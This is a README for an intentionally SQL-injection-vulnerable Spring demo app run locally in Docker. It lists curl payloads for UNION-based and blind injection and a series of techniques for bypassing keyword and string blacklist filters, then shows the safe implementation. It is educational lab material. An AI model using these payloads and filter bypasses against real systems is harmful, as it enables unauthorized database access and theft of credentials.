# Blacklist Demo for an SQLi vulnerable Spring Application

[![Video introduction](https://asciinema.org/a/Q2o20pkTZ9QEPI9tg6s8vM1ju.svg)](https://asciinema.org/a/Q2o20pkTZ9QEPI9tg6s8vM1ju)

## TL;DR

To build and run:
```
sudo docker build -t sqli_victim_webapp_java_spring .; sudo docker run --name victim.sqli.webapp_java_spring.tld -ti -p 127.0.0.1:5808:8080 -v "$(pwd)"/webapp_java_spring/:/usr/src/ sqli_victim_webapp_java_spring
```

### Happy Flow

Get currently stored contents using the rest api:

```
curl -X GET 'localhost:5808/sqlidemo/all'
```

To add stuff to the database:

```
curl -X POST localhost:5808/sqlidemo/add -d username=user -d password=password
```

Read username by id:

```
curl localhost:5808/sqlidemo/vulnbyid -d id=1
```

### Look inside

To get access to the database:
```
sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -uuser -ppassword sqli_example
```

## SQLi

Currently 2 types of SQLi is implemented:

- Java based 
- JPQL based

### Java JDBC based

Check for union select:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,NULL -- "
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,'A'"
````

Enumerate database:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- "
curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SELECT+@@VERSION)+--+"
```

### Java JPA / JPQL based

```
curl localhost:5808/sqlidemo/add -d username=user -d password=password
curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='p" 
curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='a" 
```
#### Blacklist 

For the JDBC based vulnerable rest endpoint a blacklist filter is implemented which can be applied.
To get a help display of all possible configurations enter:

```
curl localhost:5808/sqlidemo/vulnbyid -d id -d blacklistconfig=help
```

The following is an illustration of how this filter can be used and bypassed 

##### Single Quote Replacement

Bypass single quote checks using Escape Sequences ([https://mariadb.com/kb/en/string-literals/](https://mariadb.com/kb/en/string-literals/)):

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(@@VERSION) -- " -d blacklistconfig=add_oddsinglequotes
```

or applying the `as` keyword:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) as username from user where id='1" -d blacklistconfig=add_oddsinglequotes
```

##### Any Uppercase

```  
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) -- " -d blacklistconfig=block_anyuppercase
```

##### Any Lowercase

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(@@VERSION) -- " -d blacklistconfig=block_anylowercase
```

##### Keyword Sequences Check

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union/**/select null,null,(@@version) -- " -d blacklistconfig=block_keywordsequences
```

##### Comment Double Dash Check

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) #" -d blacklistconfig=block_comment_doubledash
```

##### All Comment Types Check

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) as username from user where id='1" -d blacklistconfig=block_comment_doubledash,block_comment_hash
```

##### String Detection I

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CONCAT('VERSIO','N')) -- " -d blacklistconfig=block_badstrings
```

or

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name='VERSIO' 'N') -- " -d blacklistconfig=block_badstrings
```


##### String Detection II

Using

```
echo -n 'VERSION'|base64
```

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=FROM_BASE64('VkVSU0lPTg==')) -- " -d blacklistconfig=block_badstrings,block_concatenation
```

##### String Detection III

Using

```
printf '%d %d %d %d %d %d %d' "'V" "'E" "'R" "'S" "'I" "'O" "'N"
```

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CHAR(86,69,82,83,73,79,78)) -- " -d blacklistconfig=block_badstrings,block_concatenation,block_base64
```

##### String Detection IV  

Using

```
SELECT CONCAT('0x',HEX('VERSION'))
``` 

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) -- " -d blacklistconfig=block_badstrings,block_concatenation,block_base64,block_char_function
```

##### All together

```
curl http://localhost:5808/sqlidemo/vulnbyid \       
\
-d id=\                                                                    
"1' unionunion select select null,null,(select variable_value from \       
information_schema.global_variables where variable_name=0x56455253494f4e) \
as username from user where id='1" \
\                       
-d blacklistconfig=\      
add_oddsinglequotes,\     
strip_keywordsequences,\  
block_comment_doubledash,\
block_comment_hash,\ 
block_anyuppercase,\ 
block_badstrings,\   
block_concatenation,\
block_base64,\     
block_char_function
```

## Safe Implementation

### Java based

```
curl localhost:5808/sqlidemo/safebyid -d id="1' AND SUBSTRING(password,1,1)='p"
```

### JPQL based

```
curl localhost:5808/sqlidemo/add -d username=user -d password=password
curl localhost:5808/sqlidemo/safebyid2 -d id="1' AND SUBSTRING(password,1,1)='p"
```
